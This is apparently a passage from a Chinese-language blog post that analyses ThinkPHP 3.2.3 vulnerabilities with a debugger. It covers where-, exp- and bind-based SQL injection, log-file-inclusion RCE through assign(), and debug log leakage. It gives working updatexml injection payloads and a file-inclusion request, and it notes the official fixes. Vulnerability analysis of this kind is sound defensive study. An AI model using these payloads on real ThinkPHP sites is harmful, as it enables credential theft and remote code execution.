title="环境搭建："></a>环境搭建：</h3><p>先去官网上下载一份TP3.2.3源码，再创建一个数据库<code>thinkphp</code>和数据表<code>users</code></p><p>@<a href="https://www.thinkphp.cn/Down">https://www.thinkphp.cn/Down</a></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009886.png" alt="请添加图片描述"></p><p>添加好数据后，将数据库配置设置好</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009205.png" alt="请添加图片描述"></p><p>访问一下<code>Application</code>目录下便会自动生成目录结构，接下来将控制器给配置好</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Application/Home/Controller/IndexController.<span class="keyword">class</span>.php</span><br><span class="line"><span class="comment">#更改内容为:</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">shy</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">M</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">find</span>(<span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.id&#x27;</span>));</span><br><span class="line">        <span class="title function_ invoke__">dump</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试一下效果：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009696.png" alt="在这里插入图片描述"></p><p>下断点，至于如何设置<code>PHPstorm</code>调试的可以参考如下文章：</p><p>@<a href="https://blog.csdn.net/Xxy605/article/details/120973447">https://blog.csdn.net/Xxy605/article/details/120973447</a></p><p>接下来就输入正常的SQL测试语句<code>?id=1&#39; or 1=1%23</code> ，看一下传入的参数所走的流程：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009110.png" alt="在这里插入图片描述"></p><p><code>M</code>方法先实例化一个数据库操作对象，F8跳过此方法到<code>I</code>方法中，不影响传入参数的代码就不再叙述，默认的filter是<code>htmlspecialchars()</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009456.png" alt="在这里插入图片描述"></p><p>先经过<code>htmlspecialchars()</code> 的处理，此函数默认是不转义单引号的，之后再回调<code>think_filter</code>函数进行过滤</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009760.png" alt="在这里插入图片描述"></p><p>跟踪一下这个函数，是黑名单过滤，看都过滤了哪些字符</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009044.png" alt="在这里插入图片描述"></p><p>最终参数输出为</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009110.png" alt="在这里插入图片描述"></p><p><code>I</code>方法结束后，便会进入到<code>find</code>方法中去，这个方法作用是查询数据，F7跟着代码走一下，到分析表达式这块，这里调用了<code>_parseOptions()</code> 这个函数</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009435.png" alt="在这里插入图片描述"></p><p>此时id还是之前传入的<code>1&#39; or 1=1#</code> ，跟进这个函数看做了什么处理，如下图进入字段类型验证这段代码</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009660.png" alt="在这里插入图片描述"></p><p>又有一个<code>_parseType</code> 函数对我们传入的参数（即<code>$options[&#39;where&#39;]</code>）进行处理，此时id依旧是我们传入的，跟进这个函数继续看</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009758.png" alt="在这里插入图片描述"></p><p>这里的代码把我们传入的id进行了强制类型转换，使用了<code>intval</code>这个函数，到这一步我们传入的参数就变成了1，然后再返回给<code>_parseOptions()</code> 这个函数，再进行查询便不会出现SQL注入</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009923.png" alt="请添加图片描述"></p><p>梳理一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27; or 1=1# -&gt; M() -&gt; find() -&gt; _parseOptions() -&gt; _parseType()</span></span><br></pre></td></tr></table></figure><p>传入的参数便是在<code>_parseType()</code> 这个函数处被处理了，但具体是怎么处理的还是没搞清楚，因为前面创建数据库<code>id</code>列使用的是<code>int</code> 类型，所以到<code>intval</code>这个函数就会直接被处理，所以将<code>id</code>列改为<code>varchar</code>，F7继续跟进</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009571.png" alt="在这里插入图片描述"></p><p>进入<code>buildSelectSql</code> 这个函数前，传入的参数还是正常的，跟进这个函数，进入到<code>parseSql</code> 函数，作用是对原初的SQL语句进行替换，构造的<code>id</code>在<code>where</code>那里，跟进一下<code>parseWhere()</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009902.png" alt="在这里插入图片描述"></p><p>跟进到此，又发现调用了两个函数，此时传入的还是之前的 </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009044.png" alt="在这里插入图片描述"></p><p>跟进<code>parseWhereItem</code> 这个函数，发现到这一步又调用了<code>parseValue</code> </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009949.png" alt="在这里插入图片描述"></p><p>进行跟进看一下这个函数对传入的参数进行了什么处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * value分析</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseValue</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="variable">$value</span> =  <span class="title function_ invoke__">strpos</span>(<span class="variable">$value</span>,<span class="string">&#x27;:&#x27;</span>) === <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$value</span>,<span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;bind))? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$value</span>) : <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$value</span>).<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$value</span>[<span class="number">0</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>[<span class="number">0</span>]) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>[<span class="number">0</span>]) == <span class="string">&#x27;exp&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$value</span> =  <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$value</span>[<span class="number">1</span>]);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="variable">$value</span> =  <span class="title function_ invoke__">array_map</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="string">&#x27;parseValue&#x27;</span>),<span class="variable">$value</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_bool</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="variable">$value</span> =  <span class="variable">$value</span> ? <span class="string">&#x27;1&#x27;</span> : <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="variable">$value</span> =  <span class="string">&#x27;null&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那这就很明显了，第一个if条件判断成功，进入<code>escapeString</code> 函数，使用<code>addslashes()</code> 转义传入的单引号，后面就无需再跟进了就是拼接SQL语句</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009451.png" alt="在这里插入图片描述"></p><p>但代码中还有很多判断数组的代码，因此就要考虑一下<code>id</code>传数组，再跟进代码看一下是否存在SQL注入,最后用一张图来总结便是：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009824.png" alt="在这里插入图片描述"></p><h3 id="Thinkphp3-2-3-where注入"><a href="#Thinkphp3-2-3-where注入" class="headerlink" title="Thinkphp3.2.3 where注入"></a>Thinkphp3.2.3 where注入</h3><p><strong>Payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thinkphp_3.<span class="number">2.3</span>/index.php/home/index/shy?id[where]=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,(select password <span class="keyword">from</span> users limit <span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009721.png" alt="在这里插入图片描述"></p><p>先放出Payload，下面跟着代码看是怎么出现的这个<code>where</code> 报错注入，这次传入的参数为数组 <code>?id[where]= 1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23</code> ，<code>I</code>方法在最后的代码会对数组参数的每个成员使用<code>think_filter</code>函数 </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009867.png" alt="在这里插入图片描述"></p><p>刚才跟着正常的SQL测试语句知道，知道<code>think_filter</code>函数是一个黑名单，过滤了一些特殊字符，但明显过滤的不是很全，<code>updatexml、extractvalue</code> 这些报错函数都未过滤</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009039.png" alt="在这里插入图片描述"></p><p>继续跟进便进入了<code>find</code>函数到<code>_parseOptions</code> 这个函数中，在进入此函数前<code>$options</code>是</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009319.png" alt="在这里插入图片描述"></p><p>刚才正常传入的SQL测试语句只有进入到<code>_parseType()</code>后才会被<code>intval</code> 函数给强制转换，但这里这个if判断中的<code>is_array($options[&#39;where&#39;])</code>没有满足，此时的where的值不是数组</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009897.png" alt="在这里插入图片描述"></p><p>和上面正常传入的SQL测试语句对比一下，便会发现不同，最后通过此函数处理后传入的payload依旧没有变</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009594.png" alt="在这里插入图片描述"></p><p>F7继续跟进</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009656.png" alt="在这里插入图片描述"></p><p>到<code>select</code>函数后，发现<code>buildSelectSql</code> 的作用是拼接SQL语句</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009913.png" alt="在这里插入图片描述"></p><p>跟进这个函数</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009819.png" alt="在这里插入图片描述"></p><p>第一个<code>if</code>语句就是计算<code>limit</code>，这里不是重点，发现后面又调用了<code>parseSql</code> 这个函数</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009357.png" alt="在这里插入图片描述"></p><p>构造的参数是在<code>where</code> ，跟进看一下</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009408.png" alt="在这里插入图片描述"></p><p>此时的<code>$whereStr</code> 是字符串，所以就没有经过中间的代码，直接返回此语句</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009515.png" alt="在这里插入图片描述"></p><p>F7跟进就会发现最终拼接的语句便还是我们传入的，并没有被过滤掉，便导致了thinkphp3.2.3 where注入</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009669.png" alt="在这里插入图片描述"></p><p><strong>官方修补方法：</strong></p><p>@<a href="https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04">https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04</a></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009777.png" alt="在这里插入图片描述"></p><p><code>v3.2.4</code>将<code>$options</code>和<code>$this-&gt;options</code>进行了区分，从而传入的参数无法污染到<code>$this-&gt;options</code>，也就无法控制sql语句了</p><h3 id="Thinkphp3-2-3-exp注入"><a href="#Thinkphp3-2-3-exp注入" class="headerlink" title="Thinkphp3.2.3 exp注入"></a>Thinkphp3.2.3 exp注入</h3><p><strong>payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[<span class="number">0</span>]=exp&amp;username[<span class="number">1</span>]==<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,<span class="title function_ invoke__">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009670.png" alt="在这里插入图片描述"></p><p>把环境重新更改一下，使用全局数组进行传参，这里之所以不用<code>I</code>函数来获取参数，是因为<code>I</code>函数会回调<code>think_filter()</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_filter</span>(<span class="params">&amp;<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// TODO 其他安全过滤</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="variable">$value</span> .= <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了EXP字符串，并会在后面拼接一个空格，这个点会影响exp注入，到后面便能了解了，打上断点，先进入<code>where</code>函数中</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009605.png" alt="在这里插入图片描述"></p><p>只有最后的代码对传入的参数发挥了作用,其作用便是把数组<code>array(&#39;username&#39; =&gt; $_GET[&#39;username&#39;])</code> 传给<code>$this-&gt;options[&#39;where&#39;]</code> ，继续跟进到<code>find</code>函数，一直到<code>parseWhere()</code> 函数，观察到这一步和上面的where注入有哪些区别</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009763.png" alt="在这里插入图片描述"></p><p>传入的参数会进入到<code>parseWhereItem()</code> 函数中，而where注入的是当作字符串直接跳过了这一段代码，先判断该变量是否为数组，再判断索引为0的值是否为字符串，到下面的代码还要验证该索引值是否等于<code>exp</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009900.png" alt="在这里插入图片描述"></p><p>关键点在于下面的代码：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009166.png" alt="在这里插入图片描述"></p><p>正常来说传入的参数是字符串即<code>$val=test</code>，但这里传入了数组，<code>$exp</code> 便是<code>$val[0]</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009323.png" alt="在这里插入图片描述"></p><p>又满足了<code>elseif</code>语句（跟到这里便也能理解为什么要用超全局数组，而不用I函数了，如果使用I函数不满足条件，便会异常抛出，从而影响注入），把<code>where</code>条件直接用点拼接，这时传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[<span class="number">0</span>]=exp&amp;username[<span class="number">1</span>]==<span class="number">1</span> <span class="keyword">and</span> test</span><br></pre></td></tr></table></figure><p>便会造成SQL注入，最终拼接出来的语句便是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users where `username`  <span class="variable">$val</span>[<span class="number">1</span>]  limit <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009577.png" alt="在这里插入图片描述"></p><h3 id="thinkphp3-2-3-bind注入"><a href="#thinkphp3-2-3-bind注入" class="headerlink" title="thinkphp3.2.3 bind注入"></a>thinkphp3.2.3 bind注入</h3><blockquote><p><strong>简述</strong>：由于框架实现安全数据库过程中在<code>update</code>更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注入</p></blockquote><p>将环境更改一下</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009554.png" alt="在这里插入图片描述"></p><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[<span class="number">0</span>]=bind&amp;id[<span class="number">1</span>]=<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,<span class="title function_ invoke__">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>传入参数，跟进一下代码，看一下为什么这样的<code>payload</code>能造成报错注入，跟前面几条链一样，参数会先赋值给<code>$this-&gt;options[&#39;where&#39;]</code> </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009037.png" alt="在这里插入图片描述"></p><p>再跟进到<code>save</code>方法中去，调用<code>_parseOptions</code> 方法</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009642.png" alt="在这里插入图片描述"></p><p>到这一步<code>$val</code> 为数组，不属于标量，所以不经过<code>_parseType</code>方法验证类型</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010811.png" alt="在这里插入图片描述"></p><p>从该方法中出来后<code>$this-&gt;options</code>赋值给 <code>$options</code> ，接下来便调用<code>$this-&gt;db-&gt;update</code>方法</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010861.png" alt="在这里插入图片描述"></p><p>在这里出现一段SQL语句和参数绑定，跟进<code>parseSet</code>这个方法查看</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010113.png" alt="在这里插入图片描述"></p><p>再跟进到<code>$this-&gt;bindParam($name,$val);</code> </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010614.png" alt="在这里插入图片描述"></p><p>因为<code>$this-&gt;bind</code>为空，所以<code>$name</code>为0，而<code>$val</code>为1</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010551.png" alt="在这里插入图片描述"></p><p>经过此方法的处理,SQL语句便存在一个<code>:</code> 阻断了注入，最终绑定参数为：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010565.png" alt="在这里插入图片描述"></p><p>产生的SQL语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `users` SET `password`=:<span class="number">0</span></span><br></pre></td></tr></table></figure><p>再调用<code>parseWhereItem</code>方法拼接<code>where</code>部分处理后的语句，当<code>$exp</code>为bind时，<code>$whereStr</code>部分可控</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010810.png" alt="在这里插入图片描述"></p><p>两段SQL语句再进行合并，最终形成的SQL语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `users` SET `password`=:<span class="number">0</span> WHERE `id` = :<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,<span class="title function_ invoke__">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>最后跟进<code>execute</code>方法，该方法中有对绑定参数的处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;bind))&#123;</span><br><span class="line">   <span class="variable">$that</span>   =   <span class="variable language_">$this</span>;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;queryStr =   <span class="title function_ invoke__">strtr</span>(<span class="variable">$this</span>-&gt;queryStr,<span class="title function_ invoke__">array_map</span>(function(<span class="variable">$val</span>) <span class="keyword">use</span>(<span class="variable">$that</span>)&#123; <span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$that</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$val</span>).<span class="string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="variable language_">$this</span>-&gt;bind));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这两行代码便是起到替换的作用，代码先是创建一个<a href="https://www.cnblogs.com/echojson/p/10957362.html">闭包</a>，调用<code>array_map</code>，对<code>$this-&gt;bind</code>这个数组中的每个参数都调用这个闭包，对<code>$this-&gt;bind</code>进行处理，未处理前为<code>array(&quot;:0&quot;=&gt;&quot;1&quot;);</code> ，处理后为：<code>array(&quot;:0&quot;=&gt;&quot;&#39;1&#39;&quot;);</code> ，最后再通过<code>strtr</code>函数处理<code>$this-&gt;queryStr</code>语句，得到的结果如下：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010385.png" alt="在这里插入图片描述"></p><p><code>:0</code>替换为外部传进来的字符串，所以将传入参数等于0，这样就拼接了一个<code>:0</code>，然后会通过<code>strtr()</code>被替换为1，SQL语句便可以正常执行，这也就是为什么payload中<code>id[1]=0</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010797.png" alt="在这里插入图片描述"></p><p><strong>官方修复：</strong></p><p>过滤<code>bind</code>即可</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010258.png" alt="在这里插入图片描述"></p><h2 id="TP3-2-3-RCE漏洞"><a href="#TP3-2-3-RCE漏洞" class="headerlink" title="TP3.2.3 RCE漏洞"></a>TP3.2.3 RCE漏洞</h2><blockquote><p>业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码</p></blockquote><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010066.png" alt="在这里插入图片描述"></p><p>程序会进入模板渲染方法中，需要先创建对应的模板文件（<code>View</code>），模板文件位置为：<code>\Application\Home\View\Index\index.html</code> ，这里的模板渲染方法除了<code>display</code>，也可以为<code>fetch、show</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010959.png" alt="在这里插入图片描述"></p><p>但使用<code>fetch</code>会有一些区别，如上图其程序逻辑会使用到<code>ob_start()</code>打开缓冲区，所以PHP代码的数据块和<code>echo()</code>输出都会进入缓冲区而不会立刻输出，如果想要<code>fetch</code>方法对应的攻击代码输出的话，需要在攻击代码末尾带上<code>exit()</code>或<code>die()</code></p><p>Debug开启和关闭是有一些区别的，具体如下：</p><p><strong>Log记录目录：</strong></p><p>若开启debug模式日志会到：<code>\Application\Runtime\Logs\Home\</code>下</p><p>若未开启debug模式日志会到：<code>\Application\Runtime\Logs\Common\</code>下</p><p><strong>这里以Debug关闭为例（</strong><code>define(&#39;APP_DEBUG&#39;,false)</code><strong>）</strong></p><p><strong>构造请求包：</strong></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010316.png" alt="在这里插入图片描述"></p><p><strong>构造攻击请求：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Common/<span class="number">22_08_03</span>.log</span><br></pre></td></tr></table></figure><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010855.png" alt="在这里插入图片描述"></p><p>若<code>Debug</code>开启，正确的请求日志也会被记录到日志中，只是日志路径不 一样了而已</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010429.png" alt="在这里插入图片描述"></p><p>下面跟着代码来走一遍，看看此payload如何触发文件包含导致RCE</p><p>先传入参数会先进入<code>assign</code>函数中，再赋值给<code>$this→tVar</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010989.png" alt="在这里插入图片描述"></p><p>之后会进入到<code>display</code>方法中，<code>display</code>方法开始解析并获取模板文件内容，此时模板文件路径和内容为空</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010591.png" alt="在这里插入图片描述"></p><p>再进入到<code>fetch</code>方法中，此时传入的参数为空，程序会根据配置去获取默认模板文件的位置</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010364.png" alt="在这里插入图片描述"></p><p>当<code>TMPL_ENGINE_TYPE</code> 配置为<code>php</code>时，会采用PHP原生模板，默认的为<code>Think</code> ,便进入到else分支中，获取<code>$this→tVar</code>变量值赋值给<code>$params</code>，之后再进入到<code>Hook::listen</code>方法中</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010760.png" alt="请添加图片描述"></p><p>进入<code>exec</code>方法中，处理后调用<code>Behavior\ParseTemplateBehavior</code>类中的run方法处理<code>$params</code>这个带有日志文件路径的值</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010491.png" alt="请添加图片描述"></p><p>程序进入run方法中，一系列判断后，进入else分支，调用Think\Template类中的fetch方法对变量$_data（带有日志文件路径的变量值）进行处理</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010091.png" alt="请添加图片描述"></p><p>进入Think\Template类中的fetch方法，获取缓存文件路径后，再进入Storage的load方法中</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040010551.png" alt="在这里插入图片描述"></p><p><code>$_filename</code>为之前获取的缓存文件路径，$var则为之前带有_filename=日志文件路径的数组，$vars不为空则使用extract方法的<code>EXTR_OVERWRITE</code>默认描述对变量值进行覆盖，之后include该日志文件路径，造成文件包含，最终导致包含文件造成RCE</p><h2 id="Thinkphp3-2-3-日志泄露"><a href="#Thinkphp3-2-3-日志泄露" class="headerlink" title="Thinkphp3.2.3 日志泄露"></a>Thinkphp3.2.3 日志泄露</h2><blockquote><p>前提：开启了Debug</p></blockquote><p>THINKPHP3.2 结构：<code>Application/Runtime/Logs/Home/年份_月份_日期.log</code></p><h3 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h3><p>@<a href="https://y4er.com/post/thinkphp3-vuln/">https://y4er.com/post/thinkphp3-vuln/</a></p><p>@<a href="https://blog.csdn.net/rfrder/article/details/114024426">https://blog.csdn.net/rfrder/article/details/114024426</a></p><p>@<a 